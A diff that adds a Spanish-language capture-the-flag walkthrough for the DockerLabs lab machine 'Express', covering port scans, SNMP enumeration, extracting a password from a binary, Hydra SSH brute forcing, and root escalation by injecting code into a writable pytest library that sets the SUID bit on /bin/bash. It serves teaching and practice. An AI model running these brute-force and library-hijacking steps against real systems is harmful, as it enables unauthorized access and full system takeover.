@@ -1,0 +1,213 @@
+---
+title: Express
+description: Resolución completa de la máquina virtual *Express* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Express**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone múltiples servicios, incluyendo SNMP con la comunidad `public`, que revela información sensible del sistema, incluyendo un dominio interno. También se encuentra un binario accesible públicamente que contiene credenciales embebidas, permitiendo la identificación de un usuario válido mediante fuerza bruta SSH.
+Una vez dentro, se identifica que el usuario puede ejecutar un script Python como root, y se aprovecha la escritura sobre la librería `pytest` para inyectar código malicioso que otorga el bit SUID a `/bin/bash`, obteniendo acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Express',
+    Autor: 'd1se0',
+    Dificultad: 'Media',
+    Fecha: '11/01/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Express.zip
+sudo bash auto_deploy.sh Express.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Express/{content,exploits,nmap,scripts}
+cd Express
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+Se realiza un escaneo de puertos UDP:
+
+```bash
+sudo nmap -sU --top-ports 500 -n -Pn 172.17.0.2
+```
+
+**Servicios identificados:**
+- **22/tcp** — SSH
+- **80/tcp** — HTTP
+- **161/udp** — SNMP
+
+---
+
+### 1.2 Enumeración SNMP
+
+Se verifica el uso de comunidades SNMP por defecto:
+
+```bash
+snmp-check 172.17.0.2 -c public -v 2c
+```
+
+El servicio responde con la comunidad `public`, revelando información sensible, incluyendo un dominio interno:
+
+```
+admin@express.dl
+```
+
+Se agrega el dominio al `/etc/hosts`:
+
+```bash
+echo "172.17.0.2 express.dl" | sudo tee -a /etc/hosts
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://express.dl \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,html,txt,js -t 100 -C 404
+```
+
+**Recursos encontrados:**
+- `index.html` — Página principal.
+- `robots.txt` — Información básica.
+- `/binary/` — Directorio con un binario llamado `game`.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Análisis del binario
+
+Se descarga el binario `game`. Con `strings`, se identifica una posible contraseña embebida:
+
+```bash
+strings game
+```
+
+Se confirma con Ghidra que la contraseña es válida.
+
+### 2.2 Fuerza bruta SSH
+
+Se utiliza Hydra para identificar el usuario correspondiente:
+
+```bash
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p 'PASSWORD' ssh://172.17.0.2
+```
+
+Se obtiene un usuario válido y se accede:
+
+```bash
+ssh admin@172.17.0.2
+```
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De admin → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+Se puede ejecutar `/opt/script.py` como root con Python.
+
+Se revisa el script y se identifica la importación de la librería `pytest`. El usuario tiene permisos de escritura sobre ella.
+
+Se modifica la librería para inyectar código:
+
+```python
+import os
+os.system("chmod u+s /bin/bash")
+```
+
+Se ejecuta el script con sudo:
+
+```bash
+sudo python3 /opt/script.py
+```
+
+Se obtiene una shell privilegiada:
+
+```bash
+bash -p
+```
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "SNMP con comunidad public",
+      severity: "Alta",
+      impact: "Exposición de información sensible del sistema"
+    },
+    {
+      vulnerability: "Binario accesible con credenciales embebidas",
+      severity: "Crítica",
+      impact: "Compromiso de cuentas legítimas"
+    },
+    {
+      vulnerability: "Ausencia de controles contra fuerza bruta en SSH",
+      severity: "Alta",
+      impact: "Acceso no autorizado"
+    },
+    {
+      vulnerability: "Ejecución de scripts Python con sudo",
+      severity: "Crítica",
+      impact: "Escalada directa de privilegios"
+    },
+    {
+      vulnerability: "Permisos inseguros sobre librerías del sistema",
+      severity: "Crítica",
+      impact: "Library hijacking y escalada a root"
+    }
+  ]}
+/>
